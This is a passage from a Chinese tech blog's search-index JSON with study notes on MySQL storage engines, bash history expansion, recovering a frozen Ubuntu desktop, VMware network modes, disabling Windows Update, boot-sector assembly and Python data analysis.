{"pages":[{"title":"about","text":"","link":"/about/index.html"}],"posts":[{"title":"Docker技术入门与实战","text":"前言本博客为学习由杨保华、戴玉剑、曹亚仑编著的《Docker 技术入门与实战》第三版 的前8章内容的学习笔记","link":"/2021/10/04/Docker%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/"},{"title":"MySQL存储引擎","text":"查看当前数据库支持的存储引擎 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172MariaDB [(none)]&gt; show engines \\G*************************** 1. row *************************** Engine: InnoDB Support: DEFAULT Comment: Percona-XtraDB, Supports transactions, row-level locking, and foreign keysTransactions: YES XA: YES Savepoints: YES*************************** 2. row *************************** Engine: MRG_MYISAM Support: YES Comment: Collection of identical MyISAM tablesTransactions: NO XA: NO Savepoints: NO*************************** 3. row *************************** Engine: MyISAM Support: YES Comment: Non-transactional engine with good performance and small data footprintTransactions: NO XA: NO Savepoints: NO*************************** 4. row *************************** Engine: BLACKHOLE Support: YES Comment: /dev/null storage engine (anything you write to it disappears)Transactions: NO XA: NO Savepoints: NO*************************** 5. row *************************** Engine: PERFORMANCE_SCHEMA Support: YES Comment: Performance SchemaTransactions: NO XA: NO Savepoints: NO*************************** 6. row *************************** Engine: CSV Support: YES Comment: Stores tables as CSV filesTransactions: NO XA: NO Savepoints: NO*************************** 7. row *************************** Engine: ARCHIVE Support: YES Comment: gzip-compresses tables for a low storage footprintTransactions: NO XA: NO Savepoints: NO*************************** 8. row *************************** Engine: MEMORY Support: YES Comment: Hash based, stored in memory, useful for temporary tablesTransactions: NO XA: NO Savepoints: NO*************************** 9. row *************************** Engine: FEDERATED Support: YES Comment: Allows to access tables on other MariaDB servers, supports transactions and moreTransactions: YES XA: NO Savepoints: YES*************************** 10. row *************************** Engine: Aria Support: YES Comment: Crash-safe tables with MyISAM heritageTransactions: NO XA: NO Savepoints: NO10 rows in set (0.01 sec) 各种存储引擎的特性 特点 MyISAM Memory InnoDB Archive NDB B树索引 √ √ √ – – 备份/时间点恢复 √ √ √ √ √ 支持集群 – – – – √ 聚簇索引 – – √ – – 数据压缩 √ – √ √ – 数据缓存 - N/A √ – √ 数据加密 √ √ √ √ √ 支持外键 – – √ – √ 全文索引 √ – √ – – 地理坐标数据类型 √ – √ √ √ 地理坐标索引 √ – √ – – 哈希索引 – √ – – √ 索引缓存 √ N/A √ – √ 锁粒度 表级 表级 行级 行级 行级 MVCC多版本控制 – – √ – – 支持复制 √ √ 有限 √ √ 存储限制 256TB RAM 64TB None 384EB T树索引 – – – – √ 支持事务 – – √ – √ 统计信息 √ √ √ √ √ MyISAM5.5版本之前为默认 每个MyISAM在磁盘上存储成3个文件，文件名与表名相同，扩展名： .frm 存储表定义 .MYD MYDATE，存储数据 .MYI MYINDEX，存储索引 数据文件和索引文件可以放置在不同的目录，平均分布IO，获得更快的速度 创建表时通过 DATA DIRECTORY 和 INDEX DIRECTORY语句指定，文件路径需要是绝对路径，并且具有访问权限 修复MyISAM表 CHECK TABLE REPAIR TABLE 三种存储格式 静态（固定长度）表 优点：默认，存储迅速、容易缓存，故障易恢复 缺点：占用空间较多；空格问题：插入记录后面的空格查询时会去掉 动态表 记录不是固定长度，占用空间较小 频繁的更新和删除记录会产生碎片 定期改善性能 OPTIMIZE TABLE myisamchk-r 压缩表 myisampack创建 InnoDB5.5版本之后默认 会占用更多的磁盘空间以保存数据和索引 自动增长列 auto-increment ALTER TABLE *** AUTO_INCREMENT=n; 8.0版本之前数据库重启时这个库会丢失 8.0之后，自增主键的计数器持久化到了REDO LOG中，每次计数器发生改变，都会将其写入REDO LOG，数据库重启InnoDB根据REDO LOG中的计数器信息来初始化其内存值 可以用LAST_INSERT_ID()来查询当前线程最后插入记录使用的值；插入多条则返回第一条记录使用的自动增长值；人为指定自增列的值LAST_INSERT_ID()不会更新 对于InnoDB表，自动增长列必须被索引，组合索引也必须是组合索引的第一列；MyISAM表，自动增长列可以是组合索引的其他列 外键约束 创建外键时，父表必须有对应的索引，子表在创建外键的时候也会自动创建对应的索引 在创建索引时，可以指定在删除、更新父表时，对子表进行相应的操作： RESTRICT、NO ACTION：限制在子表有关联记录的情况下父表不能更新 CASCADE：表示父表在更新或者删除时，更新或者删除子表对应的记录 SET NULL：表示父表在更新或者删除时，子表的对应字段被SET NULL CONSTRAINT fk_city_country FOREIGN KEY (country_id) REFERENCES country (country_id) ON DELETE RESTRICT ON UPDATE CASCADE; 导入多个表的数据时，如果需要忽略表之前的导入的顺序，可以暂时关闭外键约束加快处理的速度 SET FOREIGN_KEY_CHECKS = 0 关闭 SET FOREIGN_KEY_CHECKS = 1 改回原状态 查看外键信息 show create table show table status 主键和索引 InnoDB的数据文件本身就是以聚簇索引的形式保存的，这个聚簇索引称之为主索引，是InnoDB表的主键 InnoDB表必须包含主键，没有显示指定主键，InnoDB会自动创建一个长度为6个字节的long类型隐藏字段作为主键 除主键之外的其他索引叫做辅助索引或者二级索引，二级索引会指向主索引，并通过主索引获取最终数据 存储方式 使用共享表空间存储：创建的表的表结构在.frm，数据和索引在innodb_data_home_dir和innodb_data_file_dir定义的表空间中，可以是多个文件 使用多表空间存储：这种存储方式创建的表结构仍然保存在.frm中，但每个表的数据和索引单独保存在.idb中。如果是一个分区表，则每个分区对应单独的.idb文件，文件名是“表名+分区名”，可以在创建分区的时候指定每个分区的数据文件的位置 老表改成多表空间: set GLOBAL innodb_file_per_table=1; ALTER TABLE table_name ENGINE=InnoDB; 单表备份与恢复，直接复制.idb和.frm均不行 ALTER TABLE table_name DISCADE TABLESPACE; ALTER TABLE table_name IMPORT TABLESPACE; MEMORYMEMORY是MySQL中一类特殊的存储引擎。它使用存储在内存中的内容来创建表，而且数据全部放在内存中。这些特性与前面的两个很不同。 每个基于MEMORY存储引擎的表实际对应一个磁盘文件。该文件的文件名与表名相同，类型为frm类型。该文件中只存储表的结构。而其数据文件，都是存储在内存中，这样有利于数据的快速处理，提高整个表的效率。值得注意的是，服务器需要有足够的内存来维持MEMORY存储引擎的表的使用。如果不需要了，可以释放内存，甚至删除不需要的表。 MEMORY默认使用哈希索引。速度比使用B型树索引快。当然如果你想用B型树索引，可以在创建索引时指定。create index mem_hash USING HASN on tab_memory (city_id) 注意，MEMORY用到的很少，因为它是把数据存到内存中，如果内存出现异常就会影响数据。如果重启或者关机，所有数据都会消失。因此，基于MEMORY的表的生命周期很短，一般是一次性的。 MERGEMRG_MyISAM Merge表的优点：A： 分离静态的和动态的数据B：利用结构接近的的数据来优化查询C: 查询时可以访问更少的数据D：更容易维护大数据集E: 可以通过修改.mrg文件来修改Merge表，当然也可以用alter进行修改，修改后要通过FLUSH TABLES刷新表缓存，此法可以动态增加减少子表 创建方法，例：mysql&gt;CREATE TABLE t1(a INT NOT NULL PRIMARY KEY)ENGINE=MyISAM;mysql&gt;CREATE TABLE t2(a INT NOT NULL PRIMARY KEY)ENGINE=MyISAM;mysql&gt;CREATE TABLE mrg(a INT NOT NULL PRIMARY KEY)ENGINE=MERGE UNION=(t1,t2) INSERT_METHOD=LAST; 对于merge表，需要注意的是1。每个子表的结构必须一致，主表和子表的结构需要一致，2。每个子表的索引在merge表中都会存在，所以在merge表中不能根据该索引进行唯一性检索。3 子表需要是MyISAM引擎4 REPLACE在merge表中不会工作5 AUTO_INCREMENT 不会按照你所期望的方式工作。 创建Mysql Merge表的参数 INSERT_METHOD有几个参数 。LAST 如果你执行insert 指令来操作merge表时，插入操作会把数据添加到最后一个子表中。FIRST 同理，执行插入数据时会把数据添加到第一个子表中。 TokuDB第三方存储引擎： 列式存储引擎：Infobright 高写性能、高压缩：TokuDB 在MySQL最流行的支持全事务的引擎为INNODB。其特点是数据本身是用B-TREE来组织，数据本身即是庞大的根据主键聚簇的B-TREE索引。 所以在这点上，写入速度就会有些降低，因为要每次写入要用一次IO来做索引树的重排。特别是当数据量本身比内存大很多的情况下，CPU本身被磁盘IO纠缠的做不了其他事情了。这时我们要考虑如何减少对磁盘的IO来排解CPU的处境，常见的方法有： 把INNODB 个PAGE增大（默认16KB），但增大也就带来了一些缺陷。 比如，对磁盘进行CHECKPOINT的时间将延后。 把日志文件放到更快速的磁盘上，比如SSD。 TokuDB 是一个支持事务的“新”引擎，有着出色的数据压缩功能，由美国 TokuTek 公司（现在已经被 Percona 公司收购）研发。拥有出色的数据压缩功能，如果您的数据写多读少，而且数据量比较大，强烈建议您使用TokuDB，以节省空间成本，并大幅度降低存储使用量和IOPS开销，不过相应的会增加 CPU 的压力。 特性 使用Fractal树索引保证高效的插入性能 优秀的压缩特性，比InnoDB高近10倍 Hot Schema Changes特性支持在线创建索引和添加、删除属性列等DDL操作 使用Bulk Loader达到快速加载大量数据 提供了主从延迟消除技术 支持ACID和MVCC 适用情景： 日志数据，因为日志通常插入频繁且存储量大 历史数据，通常不会再有写操作，可以利用TokuDB的高压缩特性进行存储 在线DDL较频繁的场景，使用TokuDB可以大大增加系统的可用性 TokuDB的优点: 高压缩比，默认使用zlib进行压缩，尤其是对字符串(varchar,text等)类型有非常高的压缩比，比较适合存储日志、原始数据等。官方宣称可以达到1：12。 在线添加索引，不影响读写操作 HCADER 特性，支持在线字段增加、删除、扩展、重命名操作，（瞬间或秒级完成） 支持完整的ACID特性和事务机制 非常快的写入性能， Fractal-tree在事务实现上有优势,无undo log，官方称至少比innodb高9倍。 支持show processlist 进度查看 数据量可以扩展到几个TB； 不会产生索引碎片； 支持hot column addition,hot indexing,mvcc TokuDB缺点： 不支持外键(foreign key)功能，如果您的表有外键，切换到 TokuDB引擎后，此约束将被忽略。 TokuDB 不适大量读取的场景，因为压缩解压缩的原因。CPU占用会高2-3倍，但由于压缩后空间小，IO开销低，平均响应时间大概是2倍左右。 online ddl 对text,blob等类型的字段不适用 没有完善的热备工具，只能通过mysqldump进行逻辑备份 选择合适的存储引擎 MyISAM：应用以读操作和插入操作为主，只有极少的更新和删除操作，且对事务完整性没有要求，没有并发写操作。OLTP环境中一般建议不要再使用MyISAM InnoDB：适用于事务完整性的较高要求，并发条件下数据一致性，很多的更新、删除操作；支持事务的完整提交和回滚 MEMORY:所有数据保存在RAM，需要快速定位记录提供极快的访问速度；缺陷是大小有限制。通常用于更新不太频繁的小表 MERGE：可以突破对单个MyISAM表大小的限制，通过将不同的表分布在不同的磁盘上，可以有效的改善MERGE表的访问效率。对数据仓储等VLDB环境很适合。","link":"/2021/11/02/MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"title":"Linux中!的神奇用法","text":"作者：编程珠玑. 链接：https://www.cnblogs.com/bianchengzhuji/p/10170315.html 來源：博客园 前言实际上，不起眼的“!”在linux中有着很多让你惊叹的妙用。本文就来细数那些“!”的神奇用法。 执行上一条命令例如，在执行完上面一条命令后，可以使用下面的方式再次执行上一条命令： 123456$ whereis bash #执行命令bash: /bin/bash /etc/bash.bashrc /usr/share/man/man1/bash.1.gz$ !! #再次执行上一条命令whereis bashbash: /bin/bash /etc/bash.bashrc /usr/share/man/man1/bash.1.gz !!代表了上一条执行的命令。可以看到，当输入两个感叹号时，它显示上条命令的同时会执行上一条命令。当然了，通常我们还会想到使用“UP”键来完成这个事情。但是如果是基于上条命令扩充，!!就来得更加方便了。比如，你想查看某个文件，但是忘了输入more： 12$ /opt/user/test.txt #忘记输入more$ more !! #这样是不是快多了？ 使用!!是不是方便多了？ 使用上个命令第一个或最后一个的参数执行命令使用上条命令最后一个参数比如，你在使用ls列出目录内容时，没有带任何参数，但是想再次执行，带上-al参数，又不想输入长长的参数，可以使用下面的方式： 12345$ ls /proc/1/task/1/net/tcp/proc/1/task/1/net/tc$ ls -al !$ls -al /proc/1/task/1/net/tcp-r--r--r-- 1 root root 0 12月 22 17:30 /proc/1/task/1/net/tcp 这里的!$代表了上一条命令的最后一个参数。 使用上条命令第一个参数而使用上条命令的第一个参数只需要使用!^，例如： 1$ ls -al !^ 去掉最后一个参数执行上一个命令如果想执行上条命令，但不想带上最后一个参数： 123$ ls -al dir #假设dir是一个很长的字符串$ !:-ls -al 什么场景下可能会用呢？比如你上一条命令最后一个参数是一个长长的字符串，而你恰好不想不用它，并且退格键删除又慢的时候，可以使用上面的方法。 使用上条命令的所有参数前面说了使用上条命令的最后一个参数，那如果不是最后一个参数，该如何使用呢？很简单，使用!*即可。例如我们在输入find命令输错了，想要纠正的时候： 12345$ fin -name &quot;test.zip&quot; #这里find输错了。$ find !*find ./ -name &quot;test.zip&quot;./workspaces/shell/find/test.zip./workspaces/shell/test.zip 使用上条命令指定的参数有的读者可能会问了，如果我只想用其中某个参数呢？按照![命令名]:[参数号]的规则即可。例如： 12345$ cp -rf dira dirb/ #将dira拷贝到dirb$ ls -l !cp:2 #查看dira的内容ls -l diratotal 0-rw-rw-r-- 1 hyb hyb 0 12月 22 17:45 testfile 当上条命令的参数很长，而你需要取用中间的某个参数时，效果就比较明显了。 执行history中的命令我们都知道可以通过history命令可以查看之前执行过的命令，但是如何再次执行history中的命令呢？我们可以通过“UP”键可以查看，但是历史命令很长的时候，并不是很方便，这个时候“!”便派上了用场： 1234567891011$ history(这里省略更多内容)2043 touch ./dira/testfile 2044 cp -rf dira dirb/ 2045 ls -al dira 2046 ls -l dira 2047 ls -al dira 2048 ls -l dira 2049 ls -al dira 2050 ls -l dira 2051 history 我们可以看到，history命令出来可以看到之前执行过的命令，也会看到它前面带了一个数值。如果我们想执行前面的cp -rf dira dirb/命令，实际上只要用下面的方式即可： 12$ !2044 #2044是执行的第n条命令cp -rf dira dirb/ 即通过![历史命令数值]的方式执行历史命令。当然了，如果我们想执行倒数第二条命令，也是有方法的： 1$ !-2 #感叹号后面跟着一个负数，负几代表倒数第几条 按照关键字执行历史命令!可以根据关键字执行命令。 执行上一条以关键字开头的命令例如，执行上一条find命令： 1$ !find #执行上条以find开头的命令 执行上一条包含关键字的命令再例如，执行上一条包含name的命令： 1234567$ find ./ -name &quot;test&quot;./test./find/test$ !?name?find ./ -name &quot;test&quot;./test./find/test 替换上条命令的参数例如： 1$ find ./ -name &quot;old*&quot; -a -name &quot;*.zip&quot; 如果我们需要将这条命令中的old更换为new： 1$ !!:gs/old/new 逻辑非的作用这个是它最为人所熟悉的作用，例如删除除了cfg结尾以外的所有文件： 1rm !(*.cfg) #删除需谨慎 这里就不再详述。 总结惊叹号”!”的作用确实有时候让人惊叹。前面可能只是提到!结合其他字符代表某个特定的含义的某种使用，实际上，我们可以组合或者扩展发现更多的妙用。","link":"/2021/09/30/Linux%E4%B8%AD%E5%8F%B9%E5%8F%B7%E7%9A%84%E7%A5%9E%E5%A5%87%E7%94%A8%E6%B3%95/"},{"title":"Ubuntu死机解决方法汇总","text":"作者：程序员联盟链接：https://www.jianshu.com/p/36fb9eed82a3來源：简书 为什么不建议强制关机 如果长按电源按键强制关机，有可能损坏硬件或者丢失数据，甚至导致磁盘坏道！ 其实, 大部分时候的死机是假死, 不是真死… 有时候鼠标还能动呢。 还有一个原因: 对于平时忠贞不二的电脑, 我们怎么可以用强制关机这么”家暴”的手段呢… 必须要温柔。 可尝试的解决方法1. 进入TTY终端 Ctrl+Alt+F1进入TTY1终端字符界面, 输入用户名和密码以登录 输入top命令, 找到可能造成假死的进程, 用kill命令结束掉进程。然后Ctrl+Alt+F7回到桌面 2. 直接注销用户Ctrl+Alt+F1进入TTY1终端字符界面, 输入用户名和密码以登录。 然后执行以下的任意一个命令注销桌面重新登录。 1sudo pkill Xorg 或者 1sudo restart lightdm 3. 底层方法如果上面两种方法不成功, 那有可能是比较底层的软件出现问题。 可以试试 :** reisub 方法**。 说具体一点, 是一种系统请求, 直接交给内核处理。 键盘上一般都有一个键SysRq, 和PrintScreen(截屏)在一个键位上，这就是系统请求的键。 这个方法可以在死机的情况下安全地重启计算机, 数据不会丢失。 下面解释一下这个方法： 其实 SysRq是一种叫做系统请求的东西, 按住 Alt-Print 的时候就相当于按住了SysRq键，这个时候输入的一切都会直接由 Linux 内核来处理，它可以进行许多低级操作。 这个时候 reisub 中的每一个字母都是一个独立操作，分别表示： r : unRaw 将键盘控制从 X Server 那里抢回来 e : tErminate 给所有进程发送 SIGTERM 信号，让它们自己解决善后 i : kIll 给所有进程发送 SIGKILL 信号，强制他们马上关闭 s : Sync 将所有数据同步至磁盘 u : Unmount 将所有分区挂载为只读模式 b : reBoot 重启 魔法键组合 reisub 究竟该怎么用？如果某一天你的 Linux 死机了，键盘不听使唤了，Ctrl+Alt+F1 已经没有任何反应，该怎么办呢？ 使用“魔法键”：Alt+SysRq + r,e,i,s,u,b（确实很好背，就是单词 busier (英语”更忙”的意思)的倒写）。 好的，平时电脑那么正常，你自然也不会去按这些按钮。等到真的出事的时候，你把记在小纸条上的这些 tips 拿出来，然后在键盘上按，结果发现啥反应也没有，于是只能欲哭无泪了。 问题在于：究竟该怎么按这些按钮才会有效？首先，你的系统要支持这个功能，查看和开启的方法大家应该很熟悉了，网上也有很多说明，而且最幸运的是：Ubuntu 默认已经开启了这个功能。 接下来就是操作：马上你就会发现，同时按下+压根儿行不通！只会蹦出来一个屏幕截图窗口。所以，真正的做法应该是： 伸出你的左手，同时按住+键，别松开 右手先按一下，左手别松开，等1秒 右手按一下 R，左手别松开，等1秒 右手按一下 E，左手别松开。这时包括桌面在内，所有程序都会终止，你会看到一个黑乎乎的屏幕，稍微等一段时间 右手依次按下 I，S，U，B，左手别松开。每按一次都等那么几秒种，你会发现每按一次，屏幕上信息都会有所变化。最后按下B时，屏幕显示reset，这时你的左手可以松开了，等几秒钟，计算机就会安全重启。","link":"/2021/08/02/Ubuntu%E6%AD%BB%E6%9C%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/"},{"title":"Nginx缓存与负载均衡","text":"","link":"/2022/01/26/Nginx%E7%BC%93%E5%AD%98%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"title":"VMware的三种网卡","text":"作者：Yi个人 出处：https://www.cnblogs.com/feifei-cyj/p/7686166.html 版权：本作品采用「」许可协议进行许可。 作者：我是属车的链接：https://www.cnblogs.com/asker009/p/10143698.html來源：博客园 vmnet0，实际上就是一个虚拟的网桥#vmnet0，实际上就是一个虚拟的网桥，这个网桥有很若干个端口，一个端口用于连接你的Host，一个端口用于连接你的虚拟机，他们的位置是对等的，谁也不是谁的网关。所以在Bridged模式下，你可以让虚拟机成为一台和你的Host相同地位的机器。 vmnet1，这是一个Host-Only网络模式#vmnet1，这是一个Host-Only网络模式，这是用于建立一个与世隔绝的网络环境所用到的，其中vmnet1也是一个虚拟的交换机，交换机的一个 端口连接到你的Host上，另外一个端口连接到虚拟的DHCP服务器上（实际上是vmware的一个组件），另外剩下的端口就是连虚拟机了。虚拟网卡 “VMWare Virtual Ethernet Adapter for VMnet1”作为虚拟机的网关接口，为虚拟机提供服务。在虚拟机启动之后，如果你用ipconfig命令，你会很清楚的看到，你的默认网关就是指向 “VMWare Virtual Ethernet Adapter for VMnet1”网卡的地址的。（实际上它并不能提供路由，这是VMware设计使然，它是干了除了提供路由之外的一些事情——实际上是我也不知道它干了什 么事情），这里没有提供路由主要表现在没有提供NAT服务，使得虚拟机不可以访问Host-Only模式所指定的网段之外的地址。 vmnet8，这是一个NAT方式，最简单的组网方式了#vmnet8，这是一个NAT方式，最简单的组网方式了，从主机的“VMWare Virtual Ethernet Adapter for VMnet8”虚拟网卡出来，连接到vmnet8虚拟交换机，虚拟交换机的另外的口连接到虚拟的NAT服务器（这也是一个Vmware组件），还有一个口 连接到虚拟DHCP服务器，其他的口连虚拟机，虚拟机的网关即是“VMWare Virtual Ethernet Adapter for VMnet8”网卡所在的机器，废话，这肯定就是你的Host机器啦。同样，用ipconfig也可以看出来，你的虚拟机的默认网关也指向了你的 “VMWare Virtual Ethernet Adapter for VMnet8”虚拟网卡地址。相比之下，可以看出来，NAT组网方式和Host-Only方式，区别就在于是否多了一个NAT服务。 host-only与wmnet1虚拟网卡进行通信NAT模式与VMnet8虚拟网卡进行通信桥接使用的是你机器的真实网卡进行上网 用命令来配host-only模式下的网卡:ifconfig eth0 192.168.86.0ifconfig eth0 ip(要和虚拟网络编辑器里面的VMnet1的ip一致)，配完这个虚拟网卡的ip后你就可以通过在cmd命令里面ping 此ip看是否能ping通，这样没有网线也能实现网络通信了那么在有网线（意思是有网络的情况下）选择NAT模式，如何配这个VM的ip来实现通信呢找到真实机器的ip地址后，可以在网络中心或者通过cmd里面的ipconfig来获得当前真实机器的ip地址后，用如下的命令来设置VM的ip:ifconfig eth0 192.168.1.156(假设真实机器的ip是192.168.1.155),要永久生效则需要写入配置文件 wmware的vmnet0、vmnet1、vmnet8用vmware安装虚拟机后会出现三种网卡： 1、vmnet0：桥接网卡，虚拟机相当于一台实体机，可以自用访问与被访问及上网。 在桥接模式下，VMware虚拟出来的操作系统就像是局域网中的一独立的主机，它可以访问网内任何一台机器。不过你需要多于一个的IP地址，并且需要手工为虚拟系统配置IP地址、子网掩码，而且还要和宿主机器处于同一网段，这样虚拟系统才能和宿主机器进行通信。如果你想利用VMware在局域网内新建一个虚拟服务器，为局域网用户提供网络服务，就应该选择桥接模式。 （图来自internet） 2、vmnet1：Host-Only网络模式，虚拟机之间、主机与虚拟机之间互访，虚拟机无法访问外网。 在Host-Only网络中，Host-Only网络被用来设计成一个与外界隔绝的网络，其实Host-Only网络和NAT网络非常相似，唯一不同的地方就是在Host-Only网络中，没有用到NAT服务，没有服务器为VMnet1虚拟交换机做路由。 3、vmnet8：NAT，虚拟机之间、主机与虚拟机之间互访，虚拟机可以通过主机访问外网，外网无法访问虚拟机。 使用NAT模式，就是让虚拟系统借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。也就是说，使用NAT模式可以实现在虚拟系统里访问互联网。由于NAT服务协议对外部网络隐蔽内部网络，因此虚拟系统可以通过NAT服务器访问宿主机所在局域网中的其他真实主机，而反过来却不行，即宿主机以及宿主机所在网络的其他主机（更何况其它外网）不能通过NAT服务器访问虚拟机上的操作系统。（但是可以通过修改相关路由表，以让虚拟机和外网中除宿主机以外的其他主机通过VMnet1/8虚拟网卡互访。对宿主机网络来说，VMnet1/8网卡被视为通往虚拟网络的网关）采用NAT模式最大的优势是虚拟系统接入互联网非常简单，你不需要进行任何其他的配置，只需要宿主机器能访问互联网即可。","link":"/2021/10/26/VMware%E7%9A%84%E4%B8%89%E7%A7%8D%E7%BD%91%E5%8D%A1/"},{"title":"Windows系统禁止自动更新","text":"Windows + R键 输入services.msc(服务管理窗口) 找到Windows Update 停止且禁用 恢复-&gt;第一次失败 无操作 完成！！撒花","link":"/2022/02/06/Windows%E7%B3%BB%E7%BB%9F%E7%A6%81%E6%AD%A2%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/"},{"title":"30天自制操作系统day2汇编语言","text":"《30天自制操作系统》一书中第1天和第二天中有关汇编语言的程序的理解 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768; hello-os; TAB=4 ORG 0x7c00 ; 指明程序的装载地址; 以下的记述用于标准FAT12格式的软盘 JMP entry DB 0x90 DB &quot;HELLOIPL&quot; ; 启动区的名称可以是任意的字符串（8字节） DW 512 ; 每个扇区（sector）的大小（必须为512字节） DB 1 ; 簇（cluster）的大小（必须为1个扇区） DW 1 ; FAT的起始位置（一般从第一个扇区开始） DB 2 ; FAT的个数（必须为2） DW 224 ; 根目录的大小（一般设成224项） DW 2880 ; 该磁盘的大小（必须是2880扇区） DB 0xf0 ; 磁盘的种类（必须是0xf0） DW 9 ; FAT的长度（必须是9扇区） DW 18 ; 1个磁道有几个扇区 DW 2 ; 磁头数（必须是2） DD 0 ; 不使用分区，必须是0 DD 2880 ; 重写一次磁盘大小 DB 0,0,0x29 ; 意义不明，固定 DD 0xffffffff ; （可能是）卷标号码 DB &quot;HELLO-OS &quot; ; 磁盘的名称（11字节） DB &quot;FAT12 &quot; ; 磁盘格式名称（8字节） RESB 18 ; 先空出18字节; 程序核心entry: MOV AX,0 ; 初始化寄存器 MOV SS,AX MOV SP,0x7c00 MOV DS,AX MOV ES,AX MOV SI,msgputloop: MOV AL,[SI] ADD SI,1 ; 给SI加1 CMP AL,0 JE fin MOV AH,0x0e ; 显示一个文字 MOV BX,15 ; 指定字符颜色 INT 0x10 ; 调用显卡BIOS JMP putloopfin: HLT ; 让CPU停止，等待指令 JMP fin ; 无限循环msg: DB 0x0a, 0x0a ; 换行两次 DB &quot;hello, world&quot; DB 0x0a ; 换行 DB 0 RESB 0x7dfe-$ ; 填写0x00，直到0x001fe DB 0x55, 0xaa; 以下是启动区以外部分的输出 DB 0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00 RESB 4600 DB 0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00 RESB 1469432 DB：define byte 往文件里直接写入1个字节 的指令 RESB：reserve byte 储备 RESB 10 储备10行 0x：16进制数 DW：define word word表示16位 就是2字节 DD：define double-word 32位表示4个字节 RESB 0x1fe-$ $可以表示这一行现在的字节数 TAB=4：tab键的宽度 FAT12格式：(FAT12 Format)用Windows或MS-DOS格式化出来的软盘就是这种格式 启动区：(boot sector)：软盘的第一个扇区称为启动区 该扇区的最后两个字节的内容不是55 AA，计算机会认为这张盘没有所需的启动程序，就会保一个不能启动的错误 IPL：initial program loader启动程序加载器 加载操作系统本身的程序放在启动区 ORG：origin 告诉nask，在开始执行时，将这些机器指令装载到内存中的指定地址 $：代表将要读入的内存地址 JMP：jump goto entry：标签的呃声明，用于指定JMP指令的跳转目地等 入口 MOV：赋值 AX：accumulator，累加寄存器 CX：counter，计数寄存器 DX：data，数据寄存器 BX：base，基址寄存器 SP：stack pointer，栈指针寄存器 BP：base pointer，基址指针寄存器 SI：source index，源变址寄存器 DI：destination index，目的变址寄存器 16位寄存器，因此可以存储16位的二进制数 X表示扩展 ====================================================================================================================================================== AL：累加寄存器低位（accumulator low） CL：计数寄存器低位（counter low） DL：数据寄存器低位（data low） BL：基址寄存器低位（base low） AH：累加寄存器高位（accumulator high） CH：计数寄存器高位（counter high） DH：数据寄存器高位（data high） BH：基址寄存器高位（base high） ================================================================================================================================================================ AX = AL + AH ================================================================================================================================================================ 32位寄存器：EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI 段寄存器(segment register)：16位寄存器 ES：附加段寄存器（extra segment） CS：代码段寄存器（code segment） SS：栈段寄存器（stack segment） DS：数据段寄存器（data segment） FS：没有名称（segment part 2） GS：没有名称（segment part3） =========================================================================================================================================================== MOV BYTE [678], 123 ：用内存的’678‘号地址来保存’123‘这个数值 MOV WORD [678], 123：678号和旁边的679都会做出反应，低位保存在678，高位保存在679 数据大小[地址] 可以用寄存器来指定内存地址 只有BX、BP、SI、DI 不可以：AX、CX、DX、SP MOV BX, DX MOV AL, BYTE[BX] 源数据和目的数据必须位数相同 MOV AL [BX] CMP：比较指令 JE：条件跳转指令，比较结果相等，跳转到指定的地址；不相等，则不跳转，继续执行下一条指令 fin：标号，表示结束 INT：软件中断指令 interrupt BIOS：basic input output system基本输入输出系统（程序） 出厂时就组装在电脑主板上的ROM单元里 各种函数的集合，可以被INT调用 HLT：让CPU进入待机状态 halt","link":"/2022/01/24/day2%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"title":"python数据分析与数据挖掘","text":"以下为《python数据分析与挖掘实战》（第二版）张良均、谭立云等编著一书的学习笔记 基础篇python数据分析简介python数据分析工具 扩展库 简介 Numpy 提供数组支持以及相应的高效的处理函数 SciPy 提供矩阵支持以及矩阵相关的数值计算模块 Matplotlib 强大的数据可视化工具，作图库 pandas 强大、灵活的数据分析和探索工具 StatsModels 统计建模和计量经济学，包括描述统计、统计模型估计和推断 scikit-learn 支持回归、分类、聚类等强大的机器学习库 Keras 深度学习库，用于建立神经网络以及深度学习模型 Gensim 用来做文本主体模型的库，文本挖掘会用到 数据探索数据质量分析脏数据：缺失值、异常值、不一致的值、重复数据及含有特殊符号（如#、￥、*）的数据 缺失值分析原因： 有些信息暂时无法获取，或许获取信息的代价太大 有些信息是被遗漏的 属性值不存在 缺失值的分析： 使用简单的统计分析，得到含有缺失值的属性的个数以及每个属性的未缺失数、缺失数与缺失率等 对于缺失值的处理： 删除存在缺失值的记录 对可能值进行插补 不处理 异常值分析 简单统计量分析 3σ原则P(|x-μ|&gt;3σ)≤0.003，不服从正态分布的数据可以用远离平均值的标准差倍数来描述 箱型图分析：异常值通常为小于QL-1.5IQR或大于QU+1.5IQR的值，QL称为下四分位数，表示全部观察值中有四分之一的数据取值比它小；QU称为上四分位数，表示全部观察值中有四分之一的数据取值比它大；IQR称为四分数间距。是上四分位数QU与下四分位数QL之差，期间包含了全部观察值的一半 1234567891011121314151617181920212223242526272829303132333435363738394041#-*- coding: utf-8 -*-import pandas as pdcatering_sale = '../data/catering_sale.xls' #餐饮数据data = pd.read_excel(catering_sale, index_col = u'日期') #读取数据，指定“日期”列为索引列# data = pd.read_excel(catering_sale) #读取数据，指定“日期”列为索引列print(data.describe())import matplotlib.pyplot as plt #导入图像库plt.rcParams['font.sans-serif'] = ['SimHei'] #用来正常显示中文标签plt.rcParams['axes.unicode_minus'] = False #用来正常显示负号plt.figure() #建立图像p = data.boxplot(return_type='dict') #画箱线图，直接使用DataFrame的方法print(p)x = p['fliers'][0].get_xdata() # 'flies'即为异常值的标签print(x)y = p['fliers'][0].get_ydata()print(y)y.sort() #从小到大排序，该方法直接改变原对象#用annotate添加注释#其中有些相近的点，注解会出现重叠，难以看清，需要一些技巧来控制。#以下参数都是经过调试的，需要具体问题具体调试。'''Axes.annotate(s, xy, *args, 